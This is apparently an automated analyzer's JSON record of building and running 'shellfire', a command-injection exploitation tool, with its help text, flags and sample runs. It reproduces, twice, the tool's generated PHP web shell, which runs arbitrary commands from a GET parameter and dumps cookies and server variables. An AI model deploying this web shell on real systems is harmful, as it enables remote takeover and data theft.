@@ -1,0 +1,303 @@
+{
+ "build": {
+  "ok": true,
+  "tier": "python",
+  "image_digest": "sha256:7d0b47861356cb9bd488e9752f9cf60e70047356f09aa65289c3ccf539c6acfe",
+  "duration_s": 34.61,
+  "log_tail": "#11 11.94 update-perl-sax-parsers: Updating overall Perl SAX parser modules info file...\n#11 12.01 debconf: unable to initialize frontend: Dialog\n#11 12.01 debconf: (TERM is not set, so the dialog frontend is not usable.)\n#11 12.01 debconf: falling back to frontend: Readline\n#11 12.01 debconf: unable to initialize frontend: Readline\n#11 12.01 debconf: (This frontend requires a controlling tty.)\n#11 12.01 debconf: falling back to frontend: Teletype\n#11 12.07 Replacing config file /etc/perl/XML/SAX/ParserDetails.ini with new version\n#11 12.11 Setting up texinfo (6.8-6+b1) ...\n#11 12.13 Processing triggers for libc-bin (2.36-9+deb12u14) ...\n#11 12.16 Processing triggers for install-info (6.8-6+b1) ...\n#11 DONE 12.6s\n\n#12 [stage-1  3/10] COPY --from=build /opt/venv /opt/venv\n#12 DONE 0.7s\n\n#13 [stage-1  4/10] COPY --from=build /src /src\n#13 DONE 0.1s\n\n#14 [stage-1  5/10] RUN for f in /src/*.py; do       [ -f \"$f\" ] || continue;       b=$(basename \"$f\" .py);       case \"$b\" in setup|conftest|__init__) continue;; esac;       command -v \"$b\" >/dev/null 2>&1 && continue;       printf '#!/bin/sh\\nexec /opt/venv/bin/python %s \"$@\"\\n' \"$f\"         > \"/usr/local/bin/$b\" && chmod a+rx \"/usr/local/bin/$b\";     done\n#14 DONE 0.2s\n\n#15 [stage-1  6/10] RUN chmod -R a+rX /src\n#15 DONE 0.3s\n\n#16 [stage-1  7/10] COPY .ctk-agent/agent.py /opt/ctk/agent.py\n#16 DONE 0.1s\n\n#17 [stage-1  8/10] COPY .ctk-agent/helptext.py /opt/ctk/helptext.py\n#17 DONE 0.1s\n\n#18 [stage-1  9/10] COPY .ctk-fixtures/ /opt/ctk/fixtures/\n#18 DONE 1.9s\n\n#19 [stage-1 10/10] RUN useradd -u 65532 -m -s /usr/sbin/nologin ctk || true\n#19 0.182 useradd warning: ctk's uid 65532 outside of the UID_MIN 1000 and UID_MAX 60000 range.\n#19 DONE 0.3s\n\n#20 exporting to image\n#20 exporting layers\n#20 exporting layers 6.6s done\n#20 exporting manifest sha256:43dfd8d33831d048d514061e3eba88b10e5c3f1d475d5297cb0a6733a2256d1d 0.0s done\n#20 exporting config sha256:3677477eb73874917ff0be0b4bbf9128d53df9b29b710576c3cdc9411d65288f 0.0s done\n#20 exporting attestation manifest sha256:1ac74a6bf438df088db85d3d2c7465afefe6fb2832bef4e5b855a05728ffa6b6 0.0s done\n#20 exporting manifest list sha256:7d0b47861356cb9bd488e9752f9cf60e70047356f09aa65289c3ccf539c6acfe\n#20 exporting manifest list sha256:7d0b47861356cb9bd488e9752f9cf60e70047356f09aa65289c3ccf539c6acfe 0.0s done\n#20 naming to docker.io/ctk-exec/shellfire:7241ca427a53 done\n#20 unpacking to docker.io/ctk-exec/shellfire:7241ca427a53\n#20 unpacking to docker.io/ctk-exec/shellfire:7241ca427a53 1.5s done\n#20 DONE 8.2s",
+  "error": null,
+  "timed_out": false
+ },
+ "captures": [
+  {
+   "argv": [
+    "shellfire",
+    "--help"
+   ],
+   "exit_code": 0,
+   "stdout": "usage: shellfire [-h] [-c [CONFIG]] [-d] [--generate PAYLOAD] [--version]\n\nAn exploitation shell for command injection vulnerabilities.\n\noptions:\n  -h, --help          show this help message and exit\n  -c [CONFIG]         load a named config on startup.\n  -d                  enable debugging (show queries during execution)\n  --generate PAYLOAD  generate a payload to stdout. PAYLOAD can be \"php\" or\n                      \"aspnet\".\n  --version           display version and exit.\n",
+   "stderr": "",
+   "duration_ms": 651,
+   "truncated": false,
+   "error": null
+  },
+  {
+   "argv": [
+    "man",
+    "shellfire"
+   ],
+   "exit_code": 16,
+   "stdout": "",
+   "stderr": "No manual entry for shellfire\n",
+   "duration_ms": 12,
+   "truncated": false,
+   "error": null,
+   "source": "man"
+  },
+  {
+   "argv": [
+    "info",
+    "--output=-",
+    "--subnodes",
+    "shellfire"
+   ],
+   "exit_code": 0,
+   "stdout": "",
+   "stderr": "info: No menu item 'shellfire' in node '(dir)Top'\n",
+   "duration_ms": 11,
+   "truncated": false,
+   "error": null,
+   "source": "info"
+  },
+  {
+   "argv": [
+    "shellfire",
+    "--generate",
+    "php"
+   ],
+   "exit_code": 1,
+   "stdout": "--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--<?php\nif ($_GET['cmd'] == '_show_phpinfo') {\n  phpinfo();\n} else if ($_GET['cmd'] == '_show_cookie') {\n  var_dump($_COOKIE);\n} else if ($_GET['cmd'] == '_show_get') {\n  var_dump($_GET);\n} else if ($_GET['cmd'] == '_show_post') {\n  var_dump($_POST);\n} else if ($_GET['cmd'] == '_show_server') {\n  var_dump($_SERVER);\n} else {\n  system($_GET['cmd']) || print `{$_GET['cmd']}`;\n}\n?>--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--\n",
+   "stderr": "[*] Generating PHP payload...\n",
+   "duration_ms": 379,
+   "truncated": false,
+   "error": null,
+   "kind": "scenario",
+   "id": "t-model-2afb7775",
+   "title": "Candidate \u2014 run against no fixture"
+  },
+  {
+   "argv": [
+    "shellfire",
+    "-d"
+   ],
+   "exit_code": 0,
+   "stdout": "                  1@@`\n                 ,@@@@%:\n              '?K@@@@@@@h'\n            |UQ@@@@@@@@@@m`      '\n      ,   |Q@@@@@@@@@@@@@@>      *B,\n    ~4x  L@@@@@@@@@@@@@@@@y      :QQ=\n  ~d@@t ,Q@@@@@@@@@@@@@@@@@?     :Q@@y`\n ;Q@@@D.r@@@@@@@QNOppd%Q@@@@3,` ,4@@@@z\n^Q@@@@@Kz@@@j+,         `,=yQ@@@@@@@@@@=\nU@@@@@@@@Qu,                `}Q@@@@@@@@X\nQ@@@@@@@}`                    .j@@@@@@@Q\n@@@@@@@L                        L@@@@@@@\n@@@@@@0-                        'g@@@@@@\nD@@@@@O`                        `D@@@@@D\nc@@@@@Q;    /@@@@\\    /@@@@\\    ;Q@@@@@\\\n`3@@@@@Q;   @@@@@@.  ,@@@@@@   ;Q@@@@@3`\n -q@@@@@Qr  \\@@@@/    \\@@@@/  ~Q@@@@@A-\n   LQ@@@@x        .@@.        >@@@@QL\n    ~d@@@Q\\'      i@@i      `=8@@@Q~\n      =O@@@@@l            ~Q@@@@O=`\n        ;{8@@g;  |    |  '4@@8{;\n           `^tPp$p%g0Rdkhm1^'\n[*] ShellFire v0.16\n[*] Type 'help' to see available commands\n[*] Debug mode enabled.\n(config)> \n",
+   "stderr": "",
+   "duration_ms": 340,
+   "truncated": false,
+   "error": null,
+   "kind": "scenario",
+   "id": "t-model-d5bda04d",
+   "title": "Candidate \u2014 run against no fixture"
+  },
+  {
+   "kind": "batch_summary",
+   "argv": [],
+   "capped": false,
+   "commands_run": 5,
+   "binary": "shellfire",
+   "exit_code": null,
+   "stdout": "",
+   "stderr": "",
+   "duration_ms": 0,
+   "truncated": false,
+   "error": null
+  }
+ ],
+ "input_fingerprint": "a122efa64e735b1a",
+ "examples": [
+  {
+   "id": "t-model-2afb7775",
+   "title": "Candidate \u2014 run against no fixture",
+   "argv": [
+    "shellfire",
+    "--generate",
+    "php"
+   ],
+   "stdout": "--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--<?php\nif ($_GET['cmd'] == '_show_phpinfo') {\n  phpinfo();\n} else if ($_GET['cmd'] == '_show_cookie') {\n  var_dump($_COOKIE);\n} else if ($_GET['cmd'] == '_show_get') {\n  var_dump($_GET);\n} else if ($_GET['cmd'] == '_show_post') {\n  var_dump($_POST);\n} else if ($_GET['cmd'] == '_show_server') {\n  var_dump($_SERVER);\n} else {\n  system($_GET['cmd']) || print `{$_GET['cmd']}`;\n}\n?>--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--\n",
+   "stderr": "[*] Generating PHP payload...\n",
+   "exit_code": 1,
+   "duration_ms": 379,
+   "truncated": false,
+   "error": null
+  },
+  {
+   "id": "t-model-d5bda04d",
+   "title": "Candidate \u2014 run against no fixture",
+   "argv": [
+    "shellfire",
+    "-d"
+   ],
+   "stdout": "                  1@@`\n                 ,@@@@%:\n              '?K@@@@@@@h'\n            |UQ@@@@@@@@@@m`      '\n      ,   |Q@@@@@@@@@@@@@@>      *B,\n    ~4x  L@@@@@@@@@@@@@@@@y      :QQ=\n  ~d@@t ,Q@@@@@@@@@@@@@@@@@?     :Q@@y`\n ;Q@@@D.r@@@@@@@QNOppd%Q@@@@3,` ,4@@@@z\n^Q@@@@@Kz@@@j+,         `,=yQ@@@@@@@@@@=\nU@@@@@@@@Qu,                `}Q@@@@@@@@X\nQ@@@@@@@}`                    .j@@@@@@@Q\n@@@@@@@L                        L@@@@@@@\n@@@@@@0-                        'g@@@@@@\nD@@@@@O`                        `D@@@@@D\nc@@@@@Q;    /@@@@\\    /@@@@\\    ;Q@@@@@\\\n`3@@@@@Q;   @@@@@@.  ,@@@@@@   ;Q@@@@@3`\n -q@@@@@Qr  \\@@@@/    \\@@@@/  ~Q@@@@@A-\n   LQ@@@@x        .@@.        >@@@@QL\n    ~d@@@Q\\'      i@@i      `=8@@@Q~\n      =O@@@@@l            ~Q@@@@O=`\n        ;{8@@g;  |    |  '4@@8{;\n           `^tPp$p%g0Rdkhm1^'\n[*] ShellFire v0.16\n[*] Type 'help' to see available commands\n[*] Debug mode enabled.\n(config)> \n",
+   "stderr": "",
+   "exit_code": 0,
+   "duration_ms": 340,
+   "truncated": false,
+   "error": null
+  }
+ ],
+ "help": {
+  "flags_seen": {
+   "--help": "show this help message and exit",
+   "-h": "show this help message and exit",
+   "-c": "load a named config on startup.",
+   "-d": "enable debugging (show queries during execution)",
+   "--generate": "generate a payload to stdout. PAYLOAD can be \"php\" or \"aspnet\".",
+   "--version": "display version and exit."
+  },
+  "values_seen": {
+   "-c": "[CONFIG]",
+   "--generate": "PAYLOAD"
+  },
+  "aliases": {
+   "--help": [
+    "-h"
+   ]
+  },
+  "subcommand_flags": {},
+  "subcommands": [],
+  "binary": "shellfire",
+  "ladder_used": "--help",
+  "depth": 2,
+  "capped": false,
+  "text_sha256": "66bab5fc53122fbf31e8f35713424c802f80ce39c4c68b4c228dbb9921c90f3f",
+  "text": "usage: shellfire [-h] [-c [CONFIG]] [-d] [--generate PAYLOAD] [--version]\n\nAn exploitation shell for command injection vulnerabilities.\n\noptions:\n  -h, --help          show this help message and exit\n  -c [CONFIG]         load a named config on startup.\n  -d                  enable debugging (show queries during execution)\n  --generate PAYLOAD  generate a payload to stdout. PAYLOAD can be \"php\" or\n                      \"aspnet\".\n  --version           display version and exit.\n"
+ },
+ "validation": {
+  "confirmed": [
+   "--generate",
+   "--version",
+   "-c",
+   "-d"
+  ],
+  "unconfirmed": [],
+  "help_only": [
+   "--help",
+   "-h"
+  ],
+  "mining_coverage": 0.6666666666666666
+ },
+ "surface": {
+  "flags": {
+   "--generate": {
+    "source": "both",
+    "runtime_confirmed": true,
+    "help": "generate a payload to stdout. PAYLOAD can be \"php\" or \"aspnet\".",
+    "kind": "option",
+    "metavar": "PAYLOAD",
+    "first_tag": "v0.7",
+    "first_date": "2022-07-03T16:05:27-04:00",
+    "last_tag": "v0.16",
+    "last_date": "2026-08-02T22:17:14-04:00",
+    "live": true,
+    "attribution": "own",
+    "source_path": "shellfire/__init__.py",
+    "takes_value": true,
+    "value_type": "string"
+   },
+   "--help": {
+    "source": "runtime",
+    "runtime_confirmed": true,
+    "help": "show this help message and exit",
+    "aliases": [
+     "-h"
+    ]
+   },
+   "--version": {
+    "source": "both",
+    "runtime_confirmed": true,
+    "help": "display version and exit.",
+    "kind": "option",
+    "first_tag": "v0.10",
+    "first_date": "2022-09-16T02:43:03-04:00",
+    "last_tag": "v0.16",
+    "last_date": "2026-08-02T22:17:14-04:00",
+    "live": true,
+    "attribution": "own",
+    "source_path": "shellfire/__init__.py",
+    "takes_value": false
+   },
+   "-c": {
+    "source": "both",
+    "runtime_confirmed": true,
+    "help": "load a named config on startup.",
+    "kind": "option",
+    "metavar": "[CONFIG]",
+    "first_tag": "v0.8.1",
+    "first_date": "2022-08-28T23:10:59-04:00",
+    "last_tag": "v0.16",
+    "last_date": "2026-08-02T22:17:14-04:00",
+    "live": true,
+    "attribution": "own",
+    "source_path": "shellfire/__init__.py",
+    "takes_value": true,
+    "value_type": "string"
+   },
+   "-d": {
+    "source": "both",
+    "runtime_confirmed": true,
+    "help": "enable debugging (show queries during execution)",
+    "kind": "option",
+    "first_tag": "v0.7",
+    "first_date": "2022-07-03T16:05:27-04:00",
+    "last_tag": "v0.16",
+    "last_date": "2026-08-02T22:17:14-04:00",
+    "live": true,
+    "attribution": "own",
+    "source_path": "shellfire/__init__.py",
+    "takes_value": false
+   }
+  },
+  "subcommands": []
+ },
+ "skipped_reason": null,
+ "example_trials": {
+  "tried": 2,
+  "tried_this_wave": 0,
+  "promoted": 0,
+  "results": [
+   {
+    "id": "t-net-02d7fb9c",
+    "argv": [
+     "shellfire",
+     "http://dvwa"
+    ],
+    "source": "surface",
+    "path": "surface",
+    "line": 0,
+    "grade": "rejected",
+    "reason": "printed-usage",
+    "targets": [
+     "dvwa"
+    ],
+    "skipped_reason": null,
+    "exit_code": 2,
+    "output_bytes": 128
+   },
+   {
+    "id": "t-net-ce85ef3c",
+    "argv": [
+     "shellfire",
+     "dvwa"
+    ],
+    "source": "surface",
+    "path": "surface",
+    "line": 0,
+    "grade": "rejected",
+    "reason": "printed-usage",
+    "targets": [
+     "dvwa"
+    ],
+    "skipped_reason": null,
+    "exit_code": 2,
+    "output_bytes": 121
+   }
+  ],
+  "not_attempted": [
+   {
+    "raw": "shellfire",
+    "source": "readme",
+    "path": "README.md",
+    "line": 44,
+    "reason": "bare-invocation",
+    "token": ""
+   }
+  ]
+ },
+ "tool": "shellfire",
+ "repo": "unix-ninja/shellfire",
+ "head_sha": "7241ca427a53e4db64a481270ce086ae2817d128",
+ "analyzer": "exec",
+ "analyzer_version": "11",
+ "generated_at": "2026-08-04T03:04:40.369864+00:00"
+}
